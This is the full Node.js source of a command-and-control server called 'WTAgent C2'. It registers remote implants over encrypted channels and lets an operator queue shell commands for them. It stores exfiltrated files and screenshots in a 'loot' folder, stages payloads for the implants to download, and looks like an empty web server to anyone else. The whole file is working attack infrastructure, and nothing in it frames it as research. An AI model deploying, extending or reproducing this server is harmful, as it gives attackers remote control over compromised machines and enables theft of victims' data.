/**
 * wt_c2_server.js — WTAgent C2 + Operator Server (Node.js)
 *
 * Single HTTPS server on one port:
 *   /wta/*  — Agent endpoints (encrypted at app layer, no token needed)
 *   /op/*   — Operator REST API (Bearer token required)
 *
 * Usage:
 *   node wt_c2_server.js [--port 8443] [--key server.key] [--cert server.crt]
 *
 * Token is auto-generated on first run and saved to wt_op_token.txt.
 * Pass it in the WATCHTOWER UI settings panel.
 *
 * Operator API:
 *   GET    /op/agents                    — list registered agents
 *   POST   /op/task/<agentId>            — queue task: {"type":"shell","arg":"whoami"}
 *   GET    /op/tasks/<agentId>           — list all tasks for agent
 *   GET    /op/results/<agentId>         — get results for agent
 *   DELETE /op/task/<agentId>/<taskId>   — cancel pending task
 *   GET    /op/loot                      — list exfil'd files
 *   GET    /op/loot/<filename>           — download exfil file
 *   POST   /op/stage/<filename>          — stage file for agent download
 */

'use strict';

const https  = require('https');
const fs     = require('fs');
const path   = require('path');
const crypto = require('crypto');
const url    = require('url');

// ─────────────────────────────────────────────────────────────────────────────
// Config
// ─────────────────────────────────────────────────────────────────────────────
const C2_PORT       = parseInt(process.argv[process.argv.indexOf('--port') + 1] || '8443', 10);
const KEY_FILE      = process.argv[process.argv.indexOf('--key')  + 1] || path.join(__dirname, 'server.key');
const CERT_FILE     = process.argv[process.argv.indexOf('--cert') + 1] || path.join(__dirname, 'server.crt');
const PRIV_KEY_FILE = path.join(__dirname, 'agent_unwrap.key');
const TOKEN_FILE    = path.join(__dirname, 'wt_op_token.txt');
const LOOT_DIR      = path.join(__dirname, 'loot');
const STAGE_DIR     = path.join(__dirname, 'stage');
const LOG_FILE      = path.join(__dirname, 'wt_c2.log');

for (const d of [LOOT_DIR, STAGE_DIR]) {
    if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true });
}

// ─────────────────────────────────────────────────────────────────────────────
// Operator token — auto-generated once, saved to file
// ─────────────────────────────────────────────────────────────────────────────
let OP_TOKEN;
if (fs.existsSync(TOKEN_FILE)) {
    OP_TOKEN = fs.readFileSync(TOKEN_FILE, 'utf8').trim();
} else {
    OP_TOKEN = crypto.randomBytes(32).toString('hex');
    fs.writeFileSync(TOKEN_FILE, OP_TOKEN, { mode: 0o600 });
}

// ─────────────────────────────────────────────────────────────────────────────
// Logging
// ─────────────────────────────────────────────────────────────────────────────
const logStream = fs.createWriteStream(LOG_FILE, { flags: 'a' });
function log(level, msg) {
    const line = `[${new Date().toISOString()}] [${level}] ${msg}`;
    console.log(line);
    logStream.write(line + '\n');
}

// ─────────────────────────────────────────────────────────────────────────────
// In-memory state
// ─────────────────────────────────────────────────────────────────────────────
const agents  = {};   // agentId → { id, host, user, os, arch, ip, pid, lastSeen, sessionKey, hmacKey }
const tasks   = {};   // agentId → [ { task_id, type, arg, sleep, added, status } ]
const results = {};   // agentId → [ { task_id, type, out, b64, ts } ]

// ─────────────────────────────────────────────────────────────────────────────
// RSA key unwrap
// ─────────────────────────────────────────────────────────────────────────────
let serverPrivateKey = null;
try {
    serverPrivateKey = fs.readFileSync(PRIV_KEY_FILE);
    log('INFO', 'RSA private key loaded from ' + PRIV_KEY_FILE);
} catch (e) {
    log('WARN', 'RSA private key not found — session key decryption disabled');
}

function unwrapSessionKey(wrappedBuf) {
    if (!serverPrivateKey) return null;
    try {
        return crypto.privateDecrypt(
            { key: serverPrivateKey, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING, oaepHash: 'sha256' },
            wrappedBuf
        );
    } catch (e) {
        log('WARN', 'RSA unwrap failed: ' + e.message);
        return null;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Per-agent AES-256-CBC + HMAC-SHA256
// ─────────────────────────────────────────────────────────────────────────────
function decryptPayload(agentId, buf) {
    const agent = agents[agentId];
    if (!agent || !agent.sessionKey) return null;
    try {
        if (buf.length < 48) return null;
        const hmacOffset   = buf.length - 32;
        const payloadPart  = buf.slice(0, hmacOffset);
        const receivedHmac = buf.slice(hmacOffset);
        const expectedHmac = crypto.createHmac('sha256', agent.hmacKey).update(payloadPart).digest();
        if (!crypto.timingSafeEqual(receivedHmac, expectedHmac)) {
            log('WARN', `[${agentId}] HMAC mismatch`);
            return null;
        }
        const iv     = payloadPart.slice(0, 16);
        const cipher = payloadPart.slice(16);
        const dec    = crypto.createDecipheriv('aes-256-cbc', agent.sessionKey, iv);
        return Buffer.concat([dec.update(cipher), dec.final()]);
    } catch { return null; }
}

function encryptPayload(agentId, plaintext) {
    const agent = agents[agentId];
    if (!agent || !agent.sessionKey) return null;
    try {
        const iv      = crypto.randomBytes(16);
        const enc     = crypto.createCipheriv('aes-256-cbc', agent.sessionKey, iv);
        const cipher  = Buffer.concat([enc.update(plaintext), enc.final()]);
        const payload = Buffer.concat([iv, cipher]);
        const hmac    = crypto.createHmac('sha256', agent.hmacKey).update(payload).digest();
        return Buffer.concat([payload, hmac]);
    } catch { return null; }
}

// ─────────────────────────────────────────────────────────────────────────────
// Helpers
// ─────────────────────────────────────────────────────────────────────────────
function collectBody(req) {
    return new Promise((resolve, reject) => {
        const chunks = [];
        req.on('data', c => chunks.push(c));
        req.on('end',  () => resolve(Buffer.concat(chunks)));
        req.on('error', reject);
    });
}

function jsonResp(res, data, code = 200) {
    const body = JSON.stringify(data, null, 2);
    res.writeHead(code, {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization',
        'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS'
    });
    res.end(body);
}

// Parse agentId from URL query string — O(1) lookup replacing O(n) brute-force
function agentFromUrl(reqUrl) {
    const parsed = url.parse(reqUrl, true);
    const id = parsed.query.id;
    return (id && agents[id]) ? id : null;
}

// ─────────────────────────────────────────────────────────────────────────────
// Agent routes
// ─────────────────────────────────────────────────────────────────────────────
async function handleRegister(req, res) {
    const body = await collectBody(req);
    try {
        if (body.length < 4) throw new Error('Too short');
        const keyLen = (body[0] << 24) | (body[1] << 16) | (body[2] << 8) | body[3];
        if (keyLen < 1 || keyLen > 512 || body.length < 4 + keyLen + 32) throw new Error('Bad length');

        const wrappedKey  = body.slice(4, 4 + keyLen);
        const encPayload  = body.slice(4 + keyLen);
        const keyMaterial = unwrapSessionKey(wrappedKey);
        if (!keyMaterial || keyMaterial.length < 64) throw new Error('Key unwrap failed');

        const sessionKey = keyMaterial.slice(0, 32);
        const hmacKey    = keyMaterial.slice(32, 64);

        const tmpId = '_tmp_' + Date.now();
        agents[tmpId] = { sessionKey, hmacKey };
        const plain = decryptPayload(tmpId, encPayload);
        delete agents[tmpId];
        if (!plain) throw new Error('Decrypt failed');

        const reg     = JSON.parse(plain.toString('utf8'));
        const agentId = reg.id;
        if (!agentId) throw new Error('No id');

        agents[agentId] = {
            id: agentId, host: reg.host, user: reg.user,
            os: reg.os, arch: reg.arch, ip: reg.ip, pid: reg.pid,
            sessionKey, hmacKey,
            registeredAt: Date.now(), lastSeen: Date.now()
        };
        if (!tasks[agentId])   tasks[agentId]   = [];
        if (!results[agentId]) results[agentId] = [];

        log('INFO', `REGISTER: ${agentId} | ${reg.host}\\${reg.user} | ${reg.ip} | ${reg.os}`);

        const okBuf = encryptPayload(agentId, Buffer.from(JSON.stringify({ ok: true })));
        res.writeHead(200, { 'Content-Type': 'application/octet-stream' });
        res.end(okBuf);
    } catch (e) {
        log('WARN', 'Register error: ' + e.message);
        res.writeHead(400); res.end();
    }
}

async function handleCheckin(req, res) {
    const agentId = agentFromUrl(req.url);
    if (!agentId) { res.writeHead(400); res.end(); return; }

    const body  = await collectBody(req);
    const plain = decryptPayload(agentId, body);
    if (!plain) { res.writeHead(400); res.end(); return; }

    agents[agentId].lastSeen = Date.now();
    log('DEBUG', `CHECKIN: ${agentId}`);

    const pending = (tasks[agentId] || []).find(t => t.status === 'pending');
    if (pending) {
        pending.status = 'sent';
        const taskJson = JSON.stringify({
            task_id: pending.task_id, type: pending.type,
            arg: pending.arg || '', sleep: pending.sleep || 0
        });
        const enc = encryptPayload(agentId, Buffer.from(taskJson));
        log('INFO', `TASK→${agentId}: [${pending.task_id}] ${pending.type} ${pending.arg || ''}`);
        res.writeHead(200, { 'Content-Type': 'application/octet-stream' });
        res.end(enc);
    } else {
        const enc = encryptPayload(agentId, Buffer.from(JSON.stringify({ ok: true })));
        res.writeHead(200, { 'Content-Type': 'application/octet-stream' });
        res.end(enc);
    }
}

async function handleResult(req, res) {
    const agentId = agentFromUrl(req.url);
    if (!agentId) { res.writeHead(400); res.end(); return; }

    const body  = await collectBody(req);
    const plain = decryptPayload(agentId, body);
    if (!plain) { res.writeHead(400); res.end(); return; }

    const r = JSON.parse(plain.toString('utf8'));
    agents[agentId].lastSeen = Date.now();

    if (r.b64 && r.out) {
        const ext   = (r.type === 'screenshot') ? '.jpg' : '.bin';
        const fname = `${agentId}_${r.task}_${Date.now()}${ext}`;
        fs.writeFileSync(path.join(LOOT_DIR, fname), Buffer.from(r.out, 'base64'));
        log('INFO', `RESULT(file): ${agentId} task=${r.task} → loot/${fname}`);
        r.out = '[saved to loot/' + fname + ']';
    } else {
        log('INFO', `RESULT: ${agentId} task=${r.task} len=${(r.out || '').length}`);
    }

    const t = (tasks[agentId] || []).find(x => x.task_id === r.task);
    if (t) t.status = 'done';

    (results[agentId] = results[agentId] || []).unshift({
        task_id: r.task, type: r.type || '?', out: r.out || '', ts: Date.now()
    });
    if (results[agentId].length > 500) results[agentId].length = 500;

    res.writeHead(200); res.end('{}');
}

async function handleDownload(req, res) {
    const agentId = agentFromUrl(req.url);
    if (!agentId) { res.writeHead(400); res.end(); return; }

    const body  = await collectBody(req);
    const plain = decryptPayload(agentId, body);
    if (!plain) { res.writeHead(400); res.end(); return; }

    const r     = JSON.parse(plain.toString('utf8'));
    const fname = path.basename(r.file || '');
    const fpath = path.join(STAGE_DIR, fname);
    if (!fs.existsSync(fpath)) { res.writeHead(404); res.end(); return; }

    const fileBytes = fs.readFileSync(fpath);
    const enc       = encryptPayload(agentId, fileBytes);
    log('INFO', `DOWNLOAD: ${agentId} ← ${fname} (${fileBytes.length} bytes)`);
    res.writeHead(200, { 'Content-Type': 'application/octet-stream' });
    res.end(enc);
}

async function handleUpload(req, res) {
    const agentId = agentFromUrl(req.url);
    if (!agentId) { res.writeHead(400); res.end(); return; }

    const body  = await collectBody(req);
    const plain = decryptPayload(agentId, body);
    if (!plain) { res.writeHead(400); res.end(); return; }

    const r       = JSON.parse(plain.toString('utf8'));
    const fname   = path.basename(r.file || 'upload');
    const saveName = `${agentId}_${Date.now()}_${fname}`;
    fs.writeFileSync(path.join(LOOT_DIR, saveName), Buffer.from(r.data || '', 'base64'));
    log('INFO', `UPLOAD: ${agentId} → loot/${saveName}`);
    res.writeHead(200); res.end('{}');
}

// ─────────────────────────────────────────────────────────────────────────────
// Operator routes (Bearer token required)
// ─────────────────────────────────────────────────────────────────────────────
function checkToken(req) {
    const auth = req.headers['authorization'] || '';
    return auth === 'Bearer ' + OP_TOKEN;
}

async function handleOperator(req, res, pathname) {
    if (!checkToken(req)) {
        res.writeHead(401, { 'WWW-Authenticate': 'Bearer', 'Access-Control-Allow-Origin': '*' });
        return res.end('{"error":"Unauthorized"}');
    }

    // GET /op/agents
    if (req.method === 'GET' && pathname === '/op/agents') {
        const list = Object.values(agents).map(a => ({
            id: a.id, host: a.host, user: a.user, os: a.os,
            arch: a.arch, ip: a.ip, pid: a.pid,
            lastSeen: a.lastSeen, registeredAt: a.registeredAt,
            pendingTasks: (tasks[a.id] || []).filter(t => t.status === 'pending').length,
            totalResults: (results[a.id] || []).length
        }));
        return jsonResp(res, list);
    }

    // POST /op/task/<agentId>
    const taskPost = pathname.match(/^\/op\/task\/([^/]+)$/);
    if (req.method === 'POST' && taskPost) {
        const agentId = taskPost[1];
        if (!agents[agentId]) return jsonResp(res, { error: 'Unknown agent' }, 404);
        let t;
        try { t = JSON.parse((await collectBody(req)).toString()); }
        catch { return jsonResp(res, { error: 'Bad JSON' }, 400); }
        const task = {
            task_id: crypto.randomBytes(4).toString('hex').toUpperCase(),
            type: t.type || 'shell', arg: t.arg || '',
            sleep: t.sleep || 0, status: 'pending', added: Date.now()
        };
        (tasks[agentId] = tasks[agentId] || []).push(task);
        log('INFO', `OP TASK: ${agentId} ← [${task.task_id}] ${task.type} ${task.arg}`);
        return jsonResp(res, { ok: true, task_id: task.task_id });
    }

    // GET /op/tasks/<agentId>
    const taskGet = pathname.match(/^\/op\/tasks\/([^/]+)$/);
    if (req.method === 'GET' && taskGet) {
        return jsonResp(res, tasks[taskGet[1]] || []);
    }

    // GET /op/results/<agentId>
    const resultGet = pathname.match(/^\/op\/results\/([^/]+)$/);
    if (req.method === 'GET' && resultGet) {
        return jsonResp(res, results[resultGet[1]] || []);
    }

    // DELETE /op/task/<agentId>/<taskId>
    const taskDel = pathname.match(/^\/op\/task\/([^/]+)\/([^/]+)$/);
    if (req.method === 'DELETE' && taskDel) {
        const [, agentId, taskId] = taskDel;
        const list  = tasks[agentId] || [];
        const idx   = list.findIndex(t => t.task_id === taskId && t.status === 'pending');
        if (idx < 0) return jsonResp(res, { error: 'Task not found or not pending' }, 404);
        list.splice(idx, 1);
        return jsonResp(res, { ok: true });
    }

    // GET /op/loot
    if (req.method === 'GET' && pathname === '/op/loot') {
        const files = fs.readdirSync(LOOT_DIR).map(f => {
            const st = fs.statSync(path.join(LOOT_DIR, f));
            return { name: f, size: st.size, mtime: st.mtimeMs };
        });
        return jsonResp(res, files);
    }

    // GET /op/loot/<filename>
    const lootGet = pathname.match(/^\/op\/loot\/(.+)$/);
    if (req.method === 'GET' && lootGet) {
        const fname = path.basename(lootGet[1]);
        const fpath = path.join(LOOT_DIR, fname);
        if (!fs.existsSync(fpath)) return jsonResp(res, { error: 'Not found' }, 404);
        res.writeHead(200, {
            'Content-Type': 'application/octet-stream',
            'Content-Disposition': `attachment; filename="${fname}"`,
            'Access-Control-Allow-Origin': '*'
        });
        return fs.createReadStream(fpath).pipe(res);
    }

    // POST /op/stage/<filename>
    const stagePost = pathname.match(/^\/op\/stage\/(.+)$/);
    if (req.method === 'POST' && stagePost) {
        const fname = path.basename(stagePost[1]);
        const body  = await collectBody(req);
        fs.writeFileSync(path.join(STAGE_DIR, fname), body);
        log('INFO', `STAGE: ${fname} (${body.length} bytes)`);
        return jsonResp(res, { ok: true, file: fname, size: body.length });
    }

    return jsonResp(res, { error: 'Not found' }, 404);
}

// ─────────────────────────────────────────────────────────────────────────────
// Main router
// ─────────────────────────────────────────────────────────────────────────────
async function mainRouter(req, res) {
    const { pathname } = url.parse(req.url);

    // CORS preflight
    if (req.method === 'OPTIONS') {
        res.writeHead(204, {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type, Authorization'
        });
        return res.end();
    }

    // Operator API
    if (pathname.startsWith('/op/')) return handleOperator(req, res, pathname);

    // Agent endpoints
    if (req.method === 'POST' && pathname === '/wta/register') return handleRegister(req, res);
    if (req.method === 'POST' && pathname === '/wta/checkin')  return handleCheckin(req, res);
    if (req.method === 'POST' && pathname === '/wta/result')   return handleResult(req, res);
    if (req.method === 'POST' && pathname === '/wta/download') return handleDownload(req, res);
    if (req.method === 'POST' && pathname === '/wta/upload')   return handleUpload(req, res);

    // Everything else looks like a blank web server
    res.writeHead(404, { 'Content-Type': 'text/html' });
    res.end('<html><body>Not Found</body></html>');
}

// ─────────────────────────────────────────────────────────────────────────────
// Start
// ─────────────────────────────────────────────────────────────────────────────
try {
    const tlsOpts = { key: fs.readFileSync(KEY_FILE), cert: fs.readFileSync(CERT_FILE) };
    https.createServer(tlsOpts, (req, res) => {
        mainRouter(req, res).catch(e => { log('ERROR', e.message); res.writeHead(500); res.end(); });
    }).listen(C2_PORT, '0.0.0.0', () => {
        log('INFO', '─────────────────────────────────────────────────────────');
        log('INFO', ' WTAgent C2 Server started');
        log('INFO', ` Agent endpoint : https://<your-ip>:${C2_PORT}/wta/*`);
        log('INFO', ` Operator API   : https://<your-ip>:${C2_PORT}/op/*`);
        log('INFO', ` Operator token : ${OP_TOKEN}`);
        log('INFO', ` Token file     : ${TOKEN_FILE}`);
        log('INFO', '─────────────────────────────────────────────────────────');
    });
} catch (e) {
    log('ERROR', 'Failed to start: ' + e.message);
    log('ERROR', 'Run build.sh first to generate TLS certs and RSA keys.');
    process.exit(1);
}
